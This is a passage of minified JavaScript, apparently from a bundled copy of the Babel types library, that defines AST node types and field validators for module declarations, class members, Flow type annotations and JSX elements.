tNodeType)("TypeParameterDeclaration","TSTypeParameterDeclaration","Noop"),optional:!0},body:{validate:(0,w.assertNodeType)("ClassBody")},superClass:{optional:!0,validate:(0,w.assertNodeType)("Expression")},["superTypeParameters"]:{validate:(0,w.assertNodeType)("TypeParameterInstantiation","TSTypeParameterInstantiation"),optional:!0},implements:{validate:(0,w.arrayOfType)("TSExpressionWithTypeArguments","ClassImplements"),optional:!0},decorators:{validate:(0,w.arrayOfType)("Decorator"),optional:!0},mixins:{validate:(0,w.assertNodeType)("InterfaceExtends"),optional:!0},declare:{validate:(0,w.assertValueType)("boolean"),optional:!0},abstract:{validate:(0,w.assertValueType)("boolean"),optional:!0}},validate:!process.env.BABEL_TYPES_8_BREAKING?void 0:function(){let X=(0,w.assertNodeType)("Identifier");return function(J,Q,Y){if(!(0,n0.default)("ExportDefaultDeclaration",J))X(Y,"id",Y.id)}}()});var HY=PK.importAttributes={attributes:{optional:!0,validate:(0,w.arrayOfType)("ImportAttribute")},assertions:{deprecated:!0,optional:!0,validate:(0,w.arrayOfType)("ImportAttribute")}};e("ExportAllDeclaration",{builder:["source"],visitor:["source","attributes","assertions"],aliases:["Statement","Declaration","ImportOrExportDeclaration","ExportDeclaration"],fields:Object.assign({source:{validate:(0,w.assertNodeType)("StringLiteral")},exportKind:(0,w.validateOptional)((0,w.assertOneOf)("type","value"))},HY)});e("ExportDefaultDeclaration",{visitor:["declaration"],aliases:["Statement","Declaration","ImportOrExportDeclaration","ExportDeclaration"],fields:{declaration:(0,w.validateType)("TSDeclareFunction","FunctionDeclaration","ClassDeclaration","Expression"),exportKind:(0,w.validateOptional)((0,w.assertOneOf)("value"))}});e("ExportNamedDeclaration",{builder:["declaration","specifiers","source"],visitor:["declaration","specifiers","source","attributes","assertions"],aliases:["Statement","Declaration","ImportOrExportDeclaration","ExportDeclaration"],fields:Object.assign({declaration:{optional:!0,validate:process.env.BABEL_TYPES_8_BREAKING?(0,w.chain)((0,w.assertNodeType)("Declaration"),Object.assign(function(X,J,Q){if(Q&&X.specifiers.length)throw TypeError("Only declaration or specifiers is allowed on ExportNamedDeclaration");if(Q&&X.source)throw TypeError("Cannot export a declaration from a source")},{oneOfNodeTypes:["Declaration"]})):(0,w.assertNodeType)("Declaration")}},HY,{specifiers:{default:[],validate:(0,w.arrayOf)(function(){let X=(0,w.assertNodeType)("ExportSpecifier","ExportDefaultSpecifier","ExportNamespaceSpecifier"),J=(0,w.assertNodeType)("ExportSpecifier");if(!process.env.BABEL_TYPES_8_BREAKING)return X;return Object.assign(function(Q,Y,W){(Q.source?X:J)(Q,Y,W)},{oneOfNodeTypes:["ExportSpecifier","ExportDefaultSpecifier","ExportNamespaceSpecifier"]})}())},source:{validate:(0,w.assertNodeType)("StringLiteral"),optional:!0},exportKind:(0,w.validateOptional)((0,w.assertOneOf)("type","value"))})});e("ExportSpecifier",{visitor:["local","exported"],aliases:["ModuleSpecifier"],fields:{local:{validate:(0,w.assertNodeType)("Identifier")},exported:{validate:(0,w.assertNodeType)("Identifier","StringLiteral")},exportKind:{validate:(0,w.assertOneOf)("type","value"),optional:!0}}});e("ForOfStatement",{visitor:["left","right","body"],builder:["left","right","body","await"],aliases:["Scopable","Statement","For","BlockParent","Loop","ForXStatement"],fields:{left:{validate:function(){if(!process.env.BABEL_TYPES_8_BREAKING)return(0,w.assertNodeType)("VariableDeclaration","LVal");let X=(0,w.assertNodeType)("VariableDeclaration"),J=(0,w.assertNodeType)("Identifier","MemberExpression","ArrayPattern","ObjectPattern","TSAsExpression","TSSatisfiesExpression","TSTypeAssertion","TSNonNullExpression");return Object.assign(function(Q,Y,W){if((0,n0.default)("VariableDeclaration",W))X(Q,Y,W);else J(Q,Y,W)},{oneOfNodeTypes:["VariableDeclaration","Identifier","MemberExpression","ArrayPattern","ObjectPattern","TSAsExpression","TSSatisfiesExpression","TSTypeAssertion","TSNonNullExpression"]})}()},right:{validate:(0,w.assertNodeType)("Expression")},body:{validate:(0,w.assertNodeType)("Statement")},await:{default:!1}}});e("ImportDeclaration",{builder:["specifiers","source"],visitor:["specifiers","source","attributes","assertions"],aliases:["Statement","Declaration","ImportOrExportDeclaration"],fields:Object.assign({},HY,{module:{optional:!0,validate:(0,w.assertValueType)("boolean")},phase:{default:null,validate:(0,w.assertOneOf)("source","defer")},specifiers:(0,w.validateArrayOfType)("ImportSpecifier","ImportDefaultSpecifier","ImportNamespaceSpecifier"),source:{validate:(0,w.assertNodeType)("StringLiteral")},importKind:{validate:(0,w.assertOneOf)("type","typeof","value"),optional:!0}})});e("ImportDefaultSpecifier",{visitor:["local"],aliases:["ModuleSpecifier"],fields:{local:{validate:(0,w.assertNodeType)("Identifier")}}});e("ImportNamespaceSpecifier",{visitor:["local"],aliases:["ModuleSpecifier"],fields:{local:{validate:(0,w.assertNodeType)("Identifier")}}});e("ImportSpecifier",{visitor:["imported","local"],builder:["local","imported"],aliases:["ModuleSpecifier"],fields:{local:{validate:(0,w.assertNodeType)("Identifier")},imported:{validate:(0,w.assertNodeType)("Identifier","StringLiteral")},importKind:{validate:(0,w.assertOneOf)("type","typeof","value"),optional:!0}}});e("ImportExpression",{visitor:["source","options"],aliases:["Expression"],fields:{phase:{default:null,validate:(0,w.assertOneOf)("source","defer")},source:{validate:(0,w.assertNodeType)("Expression")},options:{validate:(0,w.assertNodeType)("Expression"),optional:!0}}});e("MetaProperty",{visitor:["meta","property"],aliases:["Expression"],fields:{meta:{validate:process.env.BABEL_TYPES_8_BREAKING?(0,w.chain)((0,w.assertNodeType)("Identifier"),Object.assign(function(X,J,Q){let Y;switch(Q.name){case"function":Y="sent";break;case"new":Y="target";break;case"import":Y="meta";break}if(!(0,n0.default)("Identifier",X.property,{name:Y}))throw TypeError("Unrecognised MetaProperty")},{oneOfNodeTypes:["Identifier"]})):(0,w.assertNodeType)("Identifier")},property:{validate:(0,w.assertNodeType)("Identifier")}}});var n5=()=>({abstract:{validate:(0,w.assertValueType)("boolean"),optional:!0},accessibility:{validate:(0,w.assertOneOf)("public","private","protected"),optional:!0},static:{default:!1},override:{default:!1},computed:{default:!1},optional:{validate:(0,w.assertValueType)("boolean"),optional:!0},key:{validate:(0,w.chain)(function(){let X=(0,w.assertNodeType)("Identifier","StringLiteral","NumericLiteral","BigIntLiteral"),J=(0,w.assertNodeType)("Expression");return function(Q,Y,W){(Q.computed?J:X)(Q,Y,W)}}(),(0,w.assertNodeType)("Identifier","StringLiteral","NumericLiteral","BigIntLiteral","Expression"))}});PK.classMethodOrPropertyCommon=n5;var zY=()=>Object.assign({},d8(),n5(),{params:(0,w.validateArrayOfType)("FunctionParameter","TSParameterProperty"),kind:{validate:(0,w.assertOneOf)("get","set","method","constructor"),default:"method"},access:{validate:(0,w.chain)((0,w.assertValueType)("string"),(0,w.assertOneOf)("public","private","protected")),optional:!0},decorators:{validate:(0,w.arrayOfType)("Decorator"),optional:!0}});PK.classMethodOrDeclareMethodCommon=zY;e("ClassMethod",{aliases:["Function","Scopable","BlockParent","FunctionParent","Method"],builder:["kind","key","params","body","computed","static","generator","async"],visitor:["decorators","key","typeParameters","params","returnType","body"],fields:Object.assign({},zY(),vX(),{body:{validate:(0,w.assertNodeType)("BlockStatement")}})});e("ObjectPattern",{visitor:["decorators","properties","typeAnnotation"],builder:["properties"],aliases:["FunctionParameter","Pattern","PatternLike","LVal"],fields:Object.assign({},i8(),{properties:(0,w.validateArrayOfType)("RestElement","ObjectProperty")})});e("SpreadElement",{visitor:["argument"],aliases:["UnaryLike"],deprecatedAlias:"SpreadProperty",fields:{argument:{validate:(0,w.assertNodeType)("Expression")}}});e("Super",{aliases:["Expression"]});e("TaggedTemplateExpression",{visitor:["tag","typeParameters","quasi"],builder:["tag","quasi"],aliases:["Expression"],fields:{tag:{validate:(0,w.assertNodeType)("Expression")},quasi:{validate:(0,w.assertNodeType)("TemplateLiteral")},["typeParameters"]:{validate:(0,w.assertNodeType)("TypeParameterInstantiation","TSTypeParameterInstantiation"),optional:!0}}});e("TemplateElement",{builder:["value","tail"],fields:{value:{validate:(0,w.chain)((0,w.assertShape)({raw:{validate:(0,w.assertValueType)("string")},cooked:{validate:(0,w.assertValueType)("string"),optional:!0}}),function(J){let Q=J.value.raw,Y=!1,W=()=>{throw Error("Internal @babel/types error.")},{str:G,firstInvalidLoc:H}=(0,Kl.readStringContents)("template",Q,0,0,0,{unterminated(){Y=!0},strictNumericEscape:W,invalidEscapeSequence:W,numericSeparatorInEscapeSequence:W,unexpectedNumericSeparator:W,invalidDigit:W,invalidCodePoint:W});if(!Y)throw Error("Invalid raw");J.value.cooked=H?null:G})},tail:{default:!1}}});e("TemplateLiteral",{visitor:["quasis","expressions"],aliases:["Expression","Literal"],fields:{quasis:(0,w.validateArrayOfType)("TemplateElement"),expressions:{validate:(0,w.chain)((0,w.assertValueType)("array"),(0,w.assertEach)((0,w.assertNodeType)("Expression","TSType")),function(X,J,Q){if(X.quasis.length!==Q.length+1)throw TypeError(`Number of ${X.type} quasis should be exactly one more than the number of expressions.
Expected ${Q.length+1} quasis but got ${X.quasis.length}`)})}}});e("YieldExpression",{builder:["argument","delegate"],visitor:["argument"],aliases:["Expression","Terminatorless"],fields:{delegate:{validate:process.env.BABEL_TYPES_8_BREAKING?(0,w.chain)((0,w.assertValueType)("boolean"),Object.assign(function(X,J,Q){if(Q&&!X.argument)throw TypeError("Property delegate of YieldExpression cannot be true if there is no argument")},{type:"boolean"})):(0,w.assertValueType)("boolean"),default:!1},argument:{optional:!0,validate:(0,w.assertNodeType)("Expression")}}});e("AwaitExpression",{builder:["argument"],visitor:["argument"],aliases:["Expression","Terminatorless"],fields:{argument:{validate:(0,w.assertNodeType)("Expression")}}});e("Import",{aliases:["Expression"]});e("BigIntLiteral",{builder:["value"],fields:{value:{validate:(0,w.assertValueType)("string")}},aliases:["Expression","Pureish","Literal","Immutable"]});e("ExportNamespaceSpecifier",{visitor:["exported"],aliases:["ModuleSpecifier"],fields:{exported:{validate:(0,w.assertNodeType)("Identifier")}}});e("OptionalMemberExpression",{builder:["object","property","computed","optional"],visitor:["object","property"],aliases:["Expression"],fields:{object:{validate:(0,w.assertNodeType)("Expression")},property:{validate:function(){let X=(0,w.assertNodeType)("Identifier"),J=(0,w.assertNodeType)("Expression");return Object.assign(function(Y,W,G){(Y.computed?J:X)(Y,W,G)},{oneOfNodeTypes:["Expression","Identifier"]})}()},computed:{default:!1},optional:{validate:!process.env.BABEL_TYPES_8_BREAKING?(0,w.assertValueType)("boolean"):(0,w.chain)((0,w.assertValueType)("boolean"),(0,w.assertOptionalChainStart)())}}});e("OptionalCallExpression",{visitor:["callee","typeParameters","typeArguments","arguments"],builder:["callee","arguments","optional"],aliases:["Expression"],fields:Object.assign({callee:{validate:(0,w.assertNodeType)("Expression")},arguments:(0,w.validateArrayOfType)("Expression","SpreadElement","ArgumentPlaceholder"),optional:{validate:!process.env.BABEL_TYPES_8_BREAKING?(0,w.assertValueType)("boolean"):(0,w.chain)((0,w.assertValueType)("boolean"),(0,w.assertOptionalChainStart)())},typeArguments:{validate:(0,w.assertNodeType)("TypeParameterInstantiation"),optional:!0}},{typeParameters:{validate:(0,w.assertNodeType)("TSTypeParameterInstantiation"),optional:!0}})});e("ClassProperty",{visitor:["decorators","variance","key","typeAnnotation","value"],builder:["key","value","typeAnnotation","decorators","computed","static"],aliases:["Property"],fields:Object.assign({},n5(),{value:{validate:(0,w.assertNodeType)("Expression"),optional:!0},definite:{validate:(0,w.assertValueType)("boolean"),optional:!0},typeAnnotation:{validate:(0,w.assertNodeType)("TypeAnnotation","TSTypeAnnotation","Noop"),optional:!0},decorators:{validate:(0,w.arrayOfType)("Decorator"),optional:!0},readonly:{validate:(0,w.assertValueType)("boolean"),optional:!0},declare:{validate:(0,w.assertValueType)("boolean"),optional:!0},variance:{validate:(0,w.assertNodeType)("Variance"),optional:!0}})});e("ClassAccessorProperty",{visitor:["decorators","key","typeAnnotation","value"],builder:["key","value","typeAnnotation","decorators","computed","static"],aliases:["Property","Accessor"],fields:Object.assign({},n5(),{key:{validate:(0,w.chain)(function(){let X=(0,w.assertNodeType)("Identifier","StringLiteral","NumericLiteral","BigIntLiteral","PrivateName"),J=(0,w.assertNodeType)("Expression");return function(Q,Y,W){(Q.computed?J:X)(Q,Y,W)}}(),(0,w.assertNodeType)("Identifier","StringLiteral","NumericLiteral","BigIntLiteral","Expression","PrivateName"))},value:{validate:(0,w.assertNodeType)("Expression"),optional:!0},definite:{validate:(0,w.assertValueType)("boolean"),optional:!0},typeAnnotation:{validate:(0,w.assertNodeType)("TypeAnnotation","TSTypeAnnotation","Noop"),optional:!0},decorators:{validate:(0,w.arrayOfType)("Decorator"),optional:!0},readonly:{validate:(0,w.assertValueType)("boolean"),optional:!0},declare:{validate:(0,w.assertValueType)("boolean"),optional:!0},variance:{validate:(0,w.assertNodeType)("Variance"),optional:!0}})});e("ClassPrivateProperty",{visitor:["decorators","variance","key","typeAnnotation","value"],builder:["key","value","decorators","static"],aliases:["Property","Private"],fields:{key:{validate:(0,w.assertNodeType)("PrivateName")},value:{validate:(0,w.assertNodeType)("Expression"),optional:!0},typeAnnotation:{validate:(0,w.assertNodeType)("TypeAnnotation","TSTypeAnnotation","Noop"),optional:!0},decorators:{validate:(0,w.arrayOfType)("Decorator"),optional:!0},static:{validate:(0,w.assertValueType)("boolean"),default:!1},readonly:{validate:(0,w.assertValueType)("boolean"),optional:!0},optional:{validate:(0,w.assertValueType)("boolean"),optional:!0},definite:{validate:(0,w.assertValueType)("boolean"),optional:!0},variance:{validate:(0,w.assertNodeType)("Variance"),optional:!0}}});e("ClassPrivateMethod",{builder:["kind","key","params","body","static"],visitor:["decorators","key","typeParameters","params","returnType","body"],aliases:["Function","Scopable","BlockParent","FunctionParent","Method","Private"],fields:Object.assign({},zY(),vX(),{kind:{validate:(0,w.assertOneOf)("get","set","method"),default:"method"},key:{validate:(0,w.assertNodeType)("PrivateName")},body:{validate:(0,w.assertNodeType)("BlockStatement")}})});e("PrivateName",{visitor:["id"],aliases:["Private"],fields:{id:{validate:(0,w.assertNodeType)("Identifier")}}});e("StaticBlock",{visitor:["body"],fields:{body:(0,w.validateArrayOfType)("Statement")},aliases:["Scopable","BlockParent","FunctionParent"]});e("ImportAttribute",{visitor:["key","value"],fields:{key:{validate:(0,w.assertNodeType)("Identifier","StringLiteral")},value:{validate:(0,w.assertNodeType)("StringLiteral")}}})});var _K=v(()=>{var TK=X7(),x=z6(),Z1=(0,x.defineAliasedType)("Flow"),$Y=(X)=>{let J=X==="DeclareClass";Z1(X,{builder:["id","typeParameters","extends","body"],visitor:["id","typeParameters","extends",...J?["mixins","implements"]:[],"body"],aliases:["FlowDeclaration","Statement","Declaration"],fields:Object.assign({id:(0,x.validateType)("Identifier"),typeParameters:(0,x.validateOptionalType)("TypeParameterDeclaration"),extends:(0,x.validateOptional)((0,x.arrayOfType)("InterfaceExtends"))},J?{mixins:(0,x.validateOptional)((0,x.arrayOfType)("InterfaceExtends")),implements:(0,x.validateOptional)((0,x.arrayOfType)("ClassImplements"))}:{},{body:(0,x.validateType)("ObjectTypeAnnotation")})})};Z1("AnyTypeAnnotation",{aliases:["FlowType","FlowBaseAnnotation"]});Z1("ArrayTypeAnnotation",{visitor:["elementType"],aliases:["FlowType"],fields:{elementType:(0,x.validateType)("FlowType")}});Z1("BooleanTypeAnnotation",{aliases:["FlowType","FlowBaseAnnotation"]});Z1("BooleanLiteralTypeAnnotation",{builder:["value"],aliases:["FlowType"],fields:{value:(0,x.validate)((0,x.assertValueType)("boolean"))}});Z1("NullLiteralTypeAnnotation",{aliases:["FlowType","FlowBaseAnnotation"]});Z1("ClassImplements",{visitor:["id","typeParameters"],fields:{id:(0,x.validateType)("Identifier"),typeParameters:(0,x.validateOptionalType)("TypeParameterInstantiation")}});$Y("DeclareClass");Z1("DeclareFunction",{builder:["id"],visitor:["id","predicate"],aliases:["FlowDeclaration","Statement","Declaration"],fields:{id:(0,x.validateType)("Identifier"),predicate:(0,x.validateOptionalType)("DeclaredPredicate")}});$Y("DeclareInterface");Z1("DeclareModule",{builder:["id","body","kind"],visitor:["id","body"],aliases:["FlowDeclaration","Statement","Declaration"],fields:{id:(0,x.validateType)("Identifier","StringLiteral"),body:(0,x.validateType)("BlockStatement"),kind:(0,x.validateOptional)((0,x.assertOneOf)("CommonJS","ES"))}});Z1("DeclareModuleExports",{visitor:["typeAnnotation"],aliases:["FlowDeclaration","Statement","Declaration"],fields:{typeAnnotation:(0,x.validateType)("TypeAnnotation")}});Z1("DeclareTypeAlias",{visitor:["id","typeParameters","right"],aliases:["FlowDeclaration","Statement","Declaration"],fields:{id:(0,x.validateType)("Identifier"),typeParameters:(0,x.validateOptionalType)("TypeParameterDeclaration"),right:(0,x.validateType)("FlowType")}});Z1("DeclareOpaqueType",{visitor:["id","typeParameters","supertype"],aliases:["FlowDeclaration","Statement","Declaration"],fields:{id:(0,x.validateType)("Identifier"),typeParameters:(0,x.validateOptionalType)("TypeParameterDeclaration"),supertype:(0,x.validateOptionalType)("FlowType"),impltype:(0,x.validateOptionalType)("FlowType")}});Z1("DeclareVariable",{visitor:["id"],aliases:["FlowDeclaration","Statement","Declaration"],fields:{id:(0,x.validateType)("Identifier")}});Z1("DeclareExportDeclaration",{visitor:["declaration","specifiers","source","attributes"],aliases:["FlowDeclaration","Statement","Declaration"],fields:Object.assign({declaration:(0,x.validateOptionalType)("Flow"),specifiers:(0,x.validateOptional)((0,x.arrayOfType)("ExportSpecifier","ExportNamespaceSpecifier")),source:(0,x.validateOptionalType)("StringLiteral"),default:(0,x.validateOptional)((0,x.assertValueType)("boolean"))},TK.importAttributes)});Z1("DeclareExportAllDeclaration",{visitor:["source","attributes"],aliases:["FlowDeclaration","Statement","Declaration"],fields:Object.assign({source:(0,x.validateType)("StringLiteral"),exportKind:(0,x.validateOptional)((0,x.assertOneOf)("type","value"))},TK.importAttributes)});Z1("DeclaredPredicate",{visitor:["value"],aliases:["FlowPredicate"],fields:{value:(0,x.validateType)("Flow")}});Z1("ExistsTypeAnnotation",{aliases:["FlowType"]});Z1("FunctionTypeAnnotation",{builder:["typeParameters","params","rest","returnType"],visitor:["typeParameters","this","params","rest","returnType"],aliases:["FlowType"],fields:{typeParameters:(0,x.validateOptionalType)("TypeParameterDeclaration"),params:(0,x.validateArrayOfType)("FunctionTypeParam"),rest:(0,x.validateOptionalType)("FunctionTypeParam"),this:(0,x.validateOptionalType)("FunctionTypeParam"),returnType:(0,x.validateType)("FlowType")}});Z1("FunctionTypeParam",{visitor:["name","typeAnnotation"],fields:{name:(0,x.validateOptionalType)("Identifier"),typeAnnotation:(0,x.validateType)("FlowType"),optional:(0,x.validateOptional)((0,x.assertValueType)("boolean"))}});Z1("GenericTypeAnnotation",{visitor:["id","typeParameters"],aliases:["FlowType"],fields:{id:(0,x.validateType)("Identifier","QualifiedTypeIdentifier"),typeParameters:(0,x.validateOptionalType)("TypeParameterInstantiation")}});Z1("InferredPredicate",{aliases:["FlowPredicate"]});Z1("InterfaceExtends",{visitor:["id","typeParameters"],fields:{id:(0,x.validateType)("Identifier","QualifiedTypeIdentifier"),typeParameters:(0,x.validateOptionalType)("TypeParameterInstantiation")}});$Y("InterfaceDeclaration");Z1("InterfaceTypeAnnotation",{visitor:["extends","body"],aliases:["FlowType"],fields:{extends:(0,x.validateOptional)((0,x.arrayOfType)("InterfaceExtends")),body:(0,x.validateType)("ObjectTypeAnnotation")}});Z1("IntersectionTypeAnnotation",{visitor:["types"],aliases:["FlowType"],fields:{types:(0,x.validate)((0,x.arrayOfType)("FlowType"))}});Z1("MixedTypeAnnotation",{aliases:["FlowType","FlowBaseAnnotation"]});Z1("EmptyTypeAnnotation",{aliases:["FlowType","FlowBaseAnnotation"]});Z1("NullableTypeAnnotation",{visitor:["typeAnnotation"],aliases:["FlowType"],fields:{typeAnnotation:(0,x.validateType)("FlowType")}});Z1("NumberLiteralTypeAnnotation",{builder:["value"],aliases:["FlowType"],fields:{value:(0,x.validate)((0,x.assertValueType)("number"))}});Z1("NumberTypeAnnotation",{aliases:["FlowType","FlowBaseAnnotation"]});Z1("ObjectTypeAnnotation",{visitor:["properties","indexers","callProperties","internalSlots"],aliases:["FlowType"],builder:["properties","indexers","callProperties","internalSlots","exact"],fields:{properties:(0,x.validate)((0,x.arrayOfType)("ObjectTypeProperty","ObjectTypeSpreadProperty")),indexers:{validate:(0,x.arrayOfType)("ObjectTypeIndexer"),optional:!0,default:[]},callProperties:{validate:(0,x.arrayOfType)("ObjectTypeCallProperty"),optional:!0,default:[]},internalSlots:{validate:(0,x.arrayOfType)("ObjectTypeInternalSlot"),optional:!0,default:[]},exact:{validate:(0,x.assertValueType)("boolean"),default:!1},inexact:(0,x.validateOptional)((0,x.assertValueType)("boolean"))}});Z1("ObjectTypeInternalSlot",{visitor:["id","value"],builder:["id","value","optional","static","method"],aliases:["UserWhitespacable"],fields:{id:(0,x.validateType)("Identifier"),value:(0,x.validateType)("FlowType"),optional:(0,x.validate)((0,x.assertValueType)("boolean")),static:(0,x.validate)((0,x.assertValueType)("boolean")),method:(0,x.validate)((0,x.assertValueType)("boolean"))}});Z1("ObjectTypeCallProperty",{visitor:["value"],aliases:["UserWhitespacable"],fields:{value:(0,x.validateType)("FlowType"),static:(0,x.validate)((0,x.assertValueType)("boolean"))}});Z1("ObjectTypeIndexer",{visitor:["variance","id","key","value"],builder:["id","key","value","variance"],aliases:["UserWhitespacable"],fields:{id:(0,x.validateOptionalType)("Identifier"),key:(0,x.validateType)("FlowType"),value:(0,x.validateType)("FlowType"),static:(0,x.validate)((0,x.assertValueType)("boolean")),variance:(0,x.validateOptionalType)("Variance")}});Z1("ObjectTypeProperty",{visitor:["key","value","variance"],aliases:["UserWhitespacable"],fields:{key:(0,x.validateType)("Identifier","StringLiteral"),value:(0,x.validateType)("FlowType"),kind:(0,x.validate)((0,x.assertOneOf)("init","get","set")),static:(0,x.validate)((0,x.assertValueType)("boolean")),proto:(0,x.validate)((0,x.assertValueType)("boolean")),optional:(0,x.validate)((0,x.assertValueType)("boolean")),variance:(0,x.validateOptionalType)("Variance"),method:(0,x.validate)((0,x.assertValueType)("boolean"))}});Z1("ObjectTypeSpreadProperty",{visitor:["argument"],aliases:["UserWhitespacable"],fields:{argument:(0,x.validateType)("FlowType")}});Z1("OpaqueType",{visitor:["id","typeParameters","supertype","impltype"],aliases:["FlowDeclaration","Statement","Declaration"],fields:{id:(0,x.validateType)("Identifier"),typeParameters:(0,x.validateOptionalType)("TypeParameterDeclaration"),supertype:(0,x.validateOptionalType)("FlowType"),impltype:(0,x.validateType)("FlowType")}});Z1("QualifiedTypeIdentifier",{visitor:["qualification","id"],builder:["id","qualification"],fields:{id:(0,x.validateType)("Identifier"),qualification:(0,x.validateType)("Identifier","QualifiedTypeIdentifier")}});Z1("StringLiteralTypeAnnotation",{builder:["value"],aliases:["FlowType"],fields:{value:(0,x.validate)((0,x.assertValueType)("string"))}});Z1("StringTypeAnnotation",{aliases:["FlowType","FlowBaseAnnotation"]});Z1("SymbolTypeAnnotation",{aliases:["FlowType","FlowBaseAnnotation"]});Z1("ThisTypeAnnotation",{aliases:["FlowType","FlowBaseAnnotation"]});Z1("TupleTypeAnnotation",{visitor:["types"],aliases:["FlowType"],fields:{types:(0,x.validate)((0,x.arrayOfType)("FlowType"))}});Z1("TypeofTypeAnnotation",{visitor:["argument"],aliases:["FlowType"],fields:{argument:(0,x.validateType)("FlowType")}});Z1("TypeAlias",{visitor:["id","typeParameters","right"],aliases:["FlowDeclaration","Statement","Declaration"],fields:{id:(0,x.validateType)("Identifier"),typeParameters:(0,x.validateOptionalType)("TypeParameterDeclaration"),right:(0,x.validateType)("FlowType")}});Z1("TypeAnnotation",{visitor:["typeAnnotation"],fields:{typeAnnotation:(0,x.validateType)("FlowType")}});Z1("TypeCastExpression",{visitor:["expression","typeAnnotation"],aliases:["ExpressionWrapper","Expression"],fields:{expression:(0,x.validateType)("Expression"),typeAnnotation:(0,x.validateType)("TypeAnnotation")}});Z1("TypeParameter",{visitor:["bound","default","variance"],fields:{name:(0,x.validate)((0,x.assertValueType)("string")),bound:(0,x.validateOptionalType)("TypeAnnotation"),default:(0,x.validateOptionalType)("FlowType"),variance:(0,x.validateOptionalType)("Variance")}});Z1("TypeParameterDeclaration",{visitor:["params"],fields:{params:(0,x.validate)((0,x.arrayOfType)("TypeParameter"))}});Z1("TypeParameterInstantiation",{visitor:["params"],fields:{params:(0,x.validate)((0,x.arrayOfType)("FlowType"))}});Z1("UnionTypeAnnotation",{visitor:["types"],aliases:["FlowType"],fields:{types:(0,x.validate)((0,x.arrayOfType)("FlowType"))}});Z1("Variance",{builder:["kind"],fields:{kind:(0,x.validate)((0,x.assertOneOf)("minus","plus"))}});Z1("VoidTypeAnnotation",{aliases:["FlowType","FlowBaseAnnotation"]});Z1("EnumDeclaration",{aliases:["Statement","Declaration"],visitor:["id","body"],fields:{id:(0,x.validateType)("Identifier"),body:(0,x.validateType)("EnumBooleanBody","EnumNumberBody","EnumStringBody","EnumSymbolBody")}});Z1("EnumBooleanBody",{aliases:["EnumBody"],visitor:["members"],fields:{explicitType:(0,x.validate)((0,x.assertValueType)("boolean")),members:(0,x.validateArrayOfType)("EnumBooleanMember"),hasUnknownMembers:(0,x.validate)((0,x.assertValueType)("boolean"))}});Z1("EnumNumberBody",{aliases:["EnumBody"],visitor:["members"],fields:{explicitType:(0,x.validate)((0,x.assertValueType)("boolean")),members:(0,x.validateArrayOfType)("EnumNumberMember"),hasUnknownMembers:(0,x.validate)((0,x.assertValueType)("boolean"))}});Z1("EnumStringBody",{aliases:["EnumBody"],visitor:["members"],fields:{explicitType:(0,x.validate)((0,x.assertValueType)("boolean")),members:(0,x.validateArrayOfType)("EnumStringMember","EnumDefaultedMember"),hasUnknownMembers:(0,x.validate)((0,x.assertValueType)("boolean"))}});Z1("EnumSymbolBody",{aliases:["EnumBody"],visitor:["members"],fields:{members:(0,x.validateArrayOfType)("EnumDefaultedMember"),hasUnknownMembers:(0,x.validate)((0,x.assertValueType)("boolean"))}});Z1("EnumBooleanMember",{aliases:["EnumMember"],builder:["id"],visitor:["id","init"],fields:{id:(0,x.validateType)("Identifier"),init:(0,x.validateType)("BooleanLiteral")}});Z1("EnumNumberMember",{aliases:["EnumMember"],visitor:["id","init"],fields:{id:(0,x.validateType)("Identifier"),init:(0,x.validateType)("NumericLiteral")}});Z1("EnumStringMember",{aliases:["EnumMember"],visitor:["id","init"],fields:{id:(0,x.validateType)("Identifier"),init:(0,x.validateType)("StringLiteral")}});Z1("EnumDefaultedMember",{aliases:["EnumMember"],visitor:["id"],fields:{id:(0,x.validateType)("Identifier")}});Z1("IndexedAccessType",{visitor:["objectType","indexType"],aliases:["FlowType"],fields:{objectType:(0,x.validateType)("FlowType"),indexType:(0,x.validateType)("FlowType")}});Z1("OptionalIndexedAccessType",{visitor:["objectType","indexType"],aliases:["FlowType"],fields:{objectType:(0,x.validateType)("FlowType"),indexType:(0,x.validateType)("FlowType"),optional:(0,x.validate)((0,x.assertValueType)("boolean"))}})});var EK=v(()=>{var j0=z6(),s0=(0,j0.defineAliasedType)("JSX");s0("JSXAttribute",{visitor:["name","value"],aliases:["Immutable"],fields:{name:{validate:(0,j0.assertNodeType)("JSXIdentifier","JSXNamespacedName")},value:{optional:!0,validate:(0,j0.assertNodeType)("JSXElement","JSXFragment","StringLiteral","JSXExpressionContainer")}}});s0("JSXClosingElement",{visitor:["name"],aliases:["Immutable"],fields:{name:{validate:(0,j0.assertNodeType)("JSXIdentifier","JSXMemberExpression","JSXNamespacedName")}}});s0("JSXElement",{builder:["openingElement","closingElement","children","selfClosing"],visitor:["openingElement","children","closingElement"],aliases:["Immutable","Expression"],fields:Object.assign({openingElement:{validate:(0,j0.assertNodeType)("JSXOpeningElement")},closingElement:{optional:!0,validate:(0,j0.assertNodeType)("JSXClosingElement")},children:(0,j0.validateArrayOfType)("JSXText","JSXExpressionContainer","JSXSpreadChild","JSXElement","JSXFragment")},{selfClosing:{validate:(0,j0.assertValueType)("boolean"),optional:!0}})});s0("JSXEmptyExpression",{});s0("JSXExpressionContainer",{visitor:["expression"],aliases:["Immutable"],fields:{expression:{validate:(0,j0.assertNodeType)("Expression","JSXEmptyExpression")}}});s0("JSXSpreadChild",{visitor:["expression"],aliases:["Immutable"],fields:{expression:{validate:(0,j0.assertNodeType)("Expression")}}});s0("JSXIdentifier",{builder:["name"],fields:{name:{validate:(0,j0.assertValueType)("string")}}});s0("JSXMemberExpression",{visitor:["object","property"],fields:{object:{validate:(0,j0.assertNodeType)("JSXMemberExpression","JSXIdentifier")},property:{validate:(0,j0.assertNodeType)("JSXIdentifier")}}});s0("JSXNamespacedName",{visitor:["namespace","name"],fields:{namespace:{validate:(0,j0.assertNodeType)("JSXIdentifier")},name:{validate:(0,j0.assertNodeType)("JSXIdentifier")}}});s0("JSXOpeningElement",{builder:["name","attributes","selfClosing"],visitor:["name","typeParameters","typeArguments","attributes"],aliases:["Immutable"],fields:Object.assign({name:{validate:(0,j0.assertNodeType)("JSXIdentifier","JSXMemberExpression","JSXNamespacedName")},selfClosing:{default:!1},attributes:(0,j0.validateArrayOfType)("JSXAttribute","JSXSpreadAttribute"),typeArguments:{validate:(0,j0.assertNodeType)("TypeParameterInstantiation"),optional:!0}},{typeParameters:{validate:(0,j0.assertNodeType)("TSTypeParameterInstantiation"),optional:!0}})});s0("JSXSpreadAttribute",{visitor:["argument"],fields:{argument:{validate:(0,j0.assertNodeType)("Expression")}}});s0("JSXText",{aliases:["Immutable"],builder:["value"],fields:{value:{validate:(0,j0.assertValueType)("string")}}});s0("JSXFr